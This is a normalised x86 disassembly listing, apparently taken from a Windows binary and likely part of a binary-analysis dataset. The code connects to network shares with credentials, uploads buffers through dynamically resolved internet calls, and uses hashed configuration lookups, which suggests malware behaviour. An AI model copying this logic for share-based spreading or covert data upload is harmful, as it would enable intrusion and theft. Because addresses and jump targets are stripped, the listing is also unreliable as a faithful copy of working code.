mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x9410 ]
imul edx [ eax + 0x8c ]
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call sub_415cc9
lea eax [ ebp - 0x1000 ]
push eax
call [ lstrlenA@IAT ]
cmp eax 0xfff
jae r-xdata
xor al al
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x459
jne r-xdata
mov eax [ ebp - 0xd418 ]
mov [ ebp - 0x1404 ] eax
push [ ebp - 0x1404 ]
lea eax [ ebp - 0xd410 ]
push eax
lea eax [ ebp - 0x1000 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x1000 ]
push eax
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1408 ] eax
cmp [ ebp - 0x1408 ] 0x0
jle r-xdata
mov eax [ ebp - 0x1404 ]
and [ ebp + eax * 2 - 0xd410 ] 0x0
lea eax [ ebp - 0xd410 ]
push eax
lea eax [ ebp - 0x9408 ]
push eax
call [ lstrcatW@IAT ]
push 0x400
lea eax [ ebp - 0x1400 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x1
lea eax [ ebp - 0x1400 ]
push eax
lea eax [ ebp - 0x9408 ]
push eax
call sub_40ca3e
add esp 0xc
mov [ ebp - 0x9409 ] al
movzx eax [ ebp - 0x9409 ]
test eax eax
je r-xdata
mov al [ ebp - 0x9409 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x1400 ]
mov [ eax + 0x94 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x94 ] 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x94 ]
cmp eax [ ecx + 0x90 ]
jbe r-xdata
mov [ ebp - 0x9409 ] 0x0
sub_40cea5
push ebp
mov ebp esp
mov eax 0x8488
call sub_40a0e0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
leave
retn
mov eax [ ebp + 0x8 ]
and [ eax + 0x94 ] 0x0
push 0x8000
lea eax [ ebp - 0x8400 ]
push eax
call sub_40103d
pop ecx
pop ecx
push [ ebp + 0xc ]
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0x8488 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8488 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0x8488 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x8488 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
push 0x2
push r--data
lea eax [ ebp - 0x8488 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8488 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x8 ]
add eax 0xc
push eax
push r--data
lea eax [ ebp - 0x8488 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8488 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x90 ]
push r--data
lea eax [ ebp - 0x8488 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8488 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x8c ]
push r--data
lea eax [ ebp - 0x8488 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8488 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x8 ]
push r--data
lea eax [ ebp - 0x8488 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8488 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call [ lstrcatW@IAT ]
push 0x400
lea eax [ ebp - 0x400 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x1
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x8400 ]
push eax
call sub_40ca3e
add esp 0xc
mov [ ebp - 0x8401 ] al
movzx eax [ ebp - 0x8401 ]
test eax eax
je r-xdata
mov al [ ebp - 0x8401 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x400 ]
mov [ eax + 0x94 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x94 ] 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x94 ]
cmp eax [ ecx + 0x90 ]
jbe r-xdata
mov [ ebp - 0x8401 ] 0x0
sub_40d0e3
push ebp
mov ebp esp
mov eax 0x869c
call sub_40a0e0
mov [ ebp - 0x4 ] 0x8
and [ ebp - 0x8614 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8614 ] 0x102
jae r-xdata
and [ ebp - 0x410 ] 0x0
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8614 ] eax
jmp r-xdata
mov eax [ ebp - 0x8614 ]
mov [ ebp + eax * 2 - 0x610 ] 0x77
jmp r-xdata
cmp [ ebp - 0x8614 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8614 ]
inc eax
mov [ ebp - 0x8614 ] eax
mov al [ ebp - 0x8615 ]
leave
retn
push 0x8000
lea eax [ ebp - 0x8610 ]
push eax
call sub_40103d
pop ecx
pop ecx
push [ ebp + 0xc ]
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push 0x1
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push [ ebp + 0x10 ]
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push 0x3b9ac9ff
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push 0x3b9ac9ff
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push 0x3b9ac9ff
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push [ ebp - 0x8614 ]
push r--data
lea eax [ ebp - 0x8698 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8698 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
and [ ebp - 0x869c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x869c ]
cmp eax [ ebp - 0x8614 ]
jge r-xdata
push 0x400
lea eax [ ebp - 0x408 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x1
lea eax [ ebp - 0x408 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call sub_40ca3e
add esp 0xc
mov [ ebp - 0x8615 ] al
movzx eax [ ebp - 0x8615 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x610 ]
push eax
lea eax [ ebp - 0x8610 ]
push eax
call [ lstrcatW@IAT ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8614 ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp - 0x869c ]
inc eax
mov [ ebp - 0x869c ] eax
mov eax [ ebp - 0x8614 ]
dec eax
mov [ ebp - 0x8614 ] eax
sub_40d3ac
push ebp
mov ebp esp
push 0xffffffff
push sub_423be9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x118
and [ ebp - 0xcc ] 0x0
lea ecx [ ebp - 0xc4 ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xd8 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0xd0 ] 0x0
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x110 ] 0x703295f9
push 0x1
lea eax [ ebp - 0xdc ]
push eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0xc4 ]
call sub_416b05
mov [ ebp - 0x114 ] 0x7f4becad
push 0x1
lea eax [ ebp - 0xc8 ]
push eax
lea eax [ ebp - 0x114 ]
push eax
lea ecx [ ebp - 0xc4 ]
call sub_416b65
mov [ ebp - 0x118 ] 0x69b8e0a0
push 0x1
lea eax [ ebp - 0xd4 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0xc4 ]
call sub_416b65
mov ecx [ ebp + 0x8 ]
call sub_401577
mov [ rw-data ] eax
mov ecx [ ebp + 0x8 ]
call sub_4115ed
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x9c ] eax
lea eax [ ebp - 0x98 ]
push eax
call sub_40c9d3
pop ecx
lea eax [ ebp - 0x98 ]
push eax
push [ ebp - 0xdc ]
lea eax [ ebp - 0xd8 ]
push eax
call sub_40d0e3
add esp 0xc
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x109 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xc4 ]
call sub_416bd2
mov al [ ebp - 0x109 ]
jmp r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ ebp - 0xdd ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xc4 ]
call sub_416bd2
mov al [ ebp - 0xdd ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
xor eax eax
inc eax
jne r-xdata
mov eax [ ebp - 0xd8 ]
imul eax eax 0x3
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cdq
push 0x64
pop ecx
idiv ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
imul eax eax 0x64
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x9c ]
cdq
idiv [ ebp - 0x18 ]
imul eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x9c ]
je r-xdata
mov eax [ ebp - 0xd0 ]
inc eax
mov [ ebp - 0xd0 ] eax
mov eax [ ebp - 0xd0 ]
mov [ ebp - 0xe4 ] eax
mov [ ebp - 0xe8 ] 0x30177102
lea eax [ ebp - 0xe4 ]
push eax
lea eax [ ebp - 0xe8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
call sub_41e8dd
mov ecx eax
call sub_41e779
mov [ ebp - 0x120 ] eax
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x124 ]
lea ecx [ ebp - 0xc4 ]
call sub_40186c
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x108 ]
call sub_416bd2
lea ecx [ ebp - 0xc4 ]
call sub_416938
movzx eax al
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xc4 ]
call sub_416bd2
mov eax [ ebp - 0x9c ]
cdq
idiv [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x9c ]
cdq
idiv [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
and [ ebp - 0xcc ] 0x0
jmp r-xdata
and [ ebp - 0x10 ] 0x0
push [ ebp - 0xdc ]
lea eax [ ebp - 0xa4 ]
push eax
call sub_40cea5
pop ecx
pop ecx
movzx eax al
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
push 0x32
call [ Sleep@IAT ]
push [ ebp - 0xdc ]
lea eax [ ebp - 0xa4 ]
push eax
call sub_40cb71
pop ecx
pop ecx
movzx eax al
test eax eax
jne r-xdata
mov [ ebp - 0x119 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xc4 ]
call sub_416bd2
mov al [ ebp - 0x119 ]
jmp r-xdata
jmp r-xdata
xor eax eax
inc eax
je r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xcc ]
inc eax
mov [ ebp - 0xcc ] eax
mov eax [ ebp - 0xcc ]
cmp eax [ ebp - 0xd4 ]
jle r-xdata
mov eax [ ebp - 0xc8 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
jmp r-xdata
sub_40d707
push ebp
mov ebp esp
sub esp 0x2c
and [ ebp - 0x2c ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0x17
jge r-xdata
xor al al
push 0x20
push 0x0
lea eax [ ebp - 0x28 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x28 ] 0x2
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x20 ] 0x9
mov [ ebp - 0x1c ] 0x7
mov eax [ ebp - 0x2c ]
movzx eax [ eax * 2 + rw-data ]
push eax
push r--data
push [ ebp + 0x8 ]
call [ wsprintfW@IAT ]
add esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
lea eax [ ebp - 0x28 ]
push eax
call WNetAddConnection2W
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call WNetCancelConnectionW
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
leave
retn
sub_40d7b8
push ebp
mov ebp esp
sub esp 0x228
push edi
push 0x6
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40d707
add esp 0x10
movzx eax al
test eax eax
je r-xdata
xor al al
push [ ebp + 0x14 ]
push [ ebp + 0x24 ]
lea eax [ ebp - 0x1c ]
push eax
push r--data
lea eax [ ebp - 0x228 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x14
push 0x5
lea edx [ ebp - 0x228 ]
mov ecx [ ebp + 0x8 ]
call sub_411abb
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
push 0x1
lea eax [ ebp - 0x1c ]
push eax
call WNetCancelConnectionW
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_4119b9
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411aa5
push 0x1
lea eax [ ebp - 0x1c ]
push eax
call WNetCancelConnectionW
mov al 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411aa5
jmp r-xdata
pop edi
leave
retn
sub_40d86c
push ebp
mov ebp esp
push 0xffffffff
push sub_423c09
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4bc
lea ecx [ ebp - 0x46c ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413247
movzx eax al
test eax eax
jne r-xdata
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x31 ] 0x0
mov [ ebp - 0x46d ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46c ]
call sub_416bd2
mov al [ ebp - 0x46d ]
jmp r-xdata
mov al [ ebp - 0x31 ]
mov [ ebp - 0x4bd ] al
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46c ]
call sub_416bd2
mov al [ ebp - 0x4bd ]
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x474 ] eax
mov [ ebp - 0x478 ] 0x30290001
lea eax [ ebp - 0x474 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x498 ]
push eax
call sub_41e8dd
mov ecx eax
call sub_41e779
mov [ ebp - 0x4c4 ] eax
mov eax [ ebp - 0x4c4 ]
mov [ ebp - 0x4c8 ] eax
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x4c8 ]
lea ecx [ ebp - 0x46c ]
call sub_40186c
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x498 ]
call sub_416bd2
lea ecx [ ebp - 0x46c ]
call sub_416938
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov [ ebp - 0x4a0 ] 0xf22f2ed
push 0x1
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0x4a0 ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b05
mov [ ebp - 0x4a4 ] 0x124a76f5
push 0x1
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4a4 ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b05
mov [ ebp - 0x4a8 ] 0x15289533
push 0x1
lea eax [ ebp - 0x448 ]
push eax
lea eax [ ebp - 0x4a8 ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b05
mov [ ebp - 0x4ac ] 0x62358130
push 0x1
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x4ac ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b05
mov [ ebp - 0x4b0 ] 0x7f4becad
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4b0 ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b65
mov [ ebp - 0x4b4 ] 0x69b8e0a0
push 0x1
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4b4 ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b65
mov [ ebp - 0x4b8 ] 0x7c5d2258
push 0x1
lea eax [ ebp - 0x44c ]
push eax
lea eax [ ebp - 0x4b8 ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b05
push [ ebp - 0x44c ]
lea eax [ ebp - 0x23c ]
push eax
call [ lstrcpyW@IAT ]
or edx 0xffffffff
mov ecx [ ebp + 0x8 ]
call sub_413729
mov [ ebp - 0x2c ] eax
push 0xa
pop edx
mov ecx [ ebp + 0x8 ]
call sub_413729
push eax
call [ Sleep@IAT ]
or edx 0xffffffff
mov ecx [ ebp + 0x8 ]
call sub_413729
mov [ ebp - 0x444 ] eax
mov ecx [ ebp + 0x8 ]
call sub_4115ed
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
push [ ebp - 0x444 ]
push [ ebp - 0x2c ]
push [ rw-data ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
call sub_401577
push eax
push r--data
lea eax [ ebp - 0x43c ]
push eax
call [ wsprintfW@IAT ]
add esp 0x20
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x23c ]
push eax
call [ lstrcatW@IAT ]
mov [ ebp - 0x4bc ] 0xc422369
push 0x1
lea eax [ ebp - 0x44c ]
push eax
lea eax [ ebp - 0x4bc ]
push eax
lea ecx [ ebp - 0x46c ]
call sub_416b05
push [ ebp - 0x44c ]
lea eax [ ebp - 0x23c ]
push eax
call [ lstrcatW@IAT ]
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x499 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46c ]
call sub_416bd2
mov al [ ebp - 0x499 ]
jmp r-xdata
movzx eax [ ebp - 0x31 ]
test eax eax
jne r-xdata
mov [ ebp - 0x31 ] 0x1
xor eax eax
inc eax
je r-xdata
xor eax eax
inc eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x31 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x30 ]
jle r-xdata
mov eax [ ebp - 0x20 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
movzx eax [ ebp - 0x31 ]
test eax eax
jne r-xdata
push [ ebp - 0x28 ]
push [ ebp - 0x448 ]
push [ ebp - 0x38 ]
push [ ebp - 0x440 ]
lea eax [ ebp - 0x23c ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d7b8
add esp 0x20
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
sub_40dbfc
push ebp
mov ebp esp
sub esp 0xfd4
mov [ ebp - 0x18 ] 0x1
push 0x0
push 0x0
push 0x0
push 0x1
push r--data
call [ rw-data ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0xc ] 0x0
sete al
leave
retn
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xfcc ] eax
push [ ebp - 0xfcc ]
push 0x8000000
push 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
call [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
push [ ebp + 0x24 ]
push [ ebp - 0x10 ]
call [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xfd0 ] eax
push [ ebp - 0xfd0 ]
push 0x2
push 0x40000000
push [ ebp + 0x10 ]
push [ ebp - 0x10 ]
call [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x10 ]
call [ rw-data ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xfd4 ] 0x2000
mov eax [ ebp - 0xc ]
mov [ ebp - 0xfd4 ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0xfd4 ]
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
ja r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
call [ SetLastError@IAT ]
cmp [ ebp - 0xc ] 0x2000
jae r-xdata
push [ ebp - 0x8 ]
call [ rw-data ]
push 0x64
call [ Sleep@IAT ]
mov [ ebp - 0x28 ] 0xfa0
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0xfc8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call [ InternetGetLastResponseInfoW@IAT ]
jmp r-xdata
sub_40dd83
push ebp
mov ebp esp
push 0xffffffff
push sub_423c26
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4b8
and [ ebp - 0x464 ] 0x0
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x458 ] 0x0
and [ ebp - 0x44 ] 0x0
lea ecx [ ebp - 0x30 ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x51 ] 0x0
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x51 ]
mov [ ebp - 0x4b9 ] al
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call sub_416bd2
mov al [ ebp - 0x4b9 ]
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x46c ] eax
mov [ ebp - 0x470 ] 0x30383201
lea eax [ ebp - 0x46c ]
push eax
lea eax [ ebp - 0x470 ]
push eax
lea eax [ ebp - 0x490 ]
push eax
call sub_41e8dd
mov ecx eax
call sub_41e779
mov [ ebp - 0x4c0 ] eax
mov eax [ ebp - 0x4c0 ]
mov [ ebp - 0x4c4 ] eax
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x4c4 ]
lea ecx [ ebp - 0x30 ]
call sub_40186c
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x490 ]
call sub_416bd2
lea ecx [ ebp - 0x30 ]
call sub_416938
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x465 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call sub_416bd2
mov al [ ebp - 0x465 ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x498 ] 0x7c5d2258
push 0x1
lea eax [ ebp - 0x464 ]
push eax
lea eax [ ebp - 0x498 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_416b05
push [ ebp - 0x464 ]
lea eax [ ebp - 0x254 ]
push eax
call [ lstrcpyW@IAT ]
or edx 0xffffffff
mov ecx [ ebp + 0x8 ]
call sub_413729
mov [ ebp - 0x4c ] eax
push 0xa
pop edx
mov ecx [ ebp + 0x8 ]
call sub_413729
push eax
call [ Sleep@IAT ]
or edx 0xffffffff
mov ecx [ ebp + 0x8 ]
call sub_413729
mov [ ebp - 0x460 ] eax
mov ecx [ ebp + 0x8 ]
call sub_4115ed
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] edx
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
push [ ebp - 0x460 ]
push [ ebp - 0x4c ]
push [ rw-data ]
push [ ebp - 0x38 ]
push [ ebp - 0x3c ]
mov ecx [ ebp + 0x8 ]
call sub_401577
push eax
push r--data
lea eax [ ebp - 0x454 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x20
lea eax [ ebp - 0x454 ]
push eax
lea eax [ ebp - 0x254 ]
push eax
call [ lstrcatW@IAT ]
